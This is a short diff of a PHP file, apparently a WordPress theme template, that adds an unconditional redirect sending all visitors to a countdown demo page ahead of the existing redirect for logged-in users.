@@ -4,6 +4,9 @@
 	*/
 // get_header();'
 $homeurlgen = get_home_url();
+
+header("Location:https://arbitrage.ph/wp-content/themes/Countdown/demo/index.html"); 
+
 if ( is_user_logged_in() ) {
 	header("Location: ".$homeurlgen."/");
 	die();
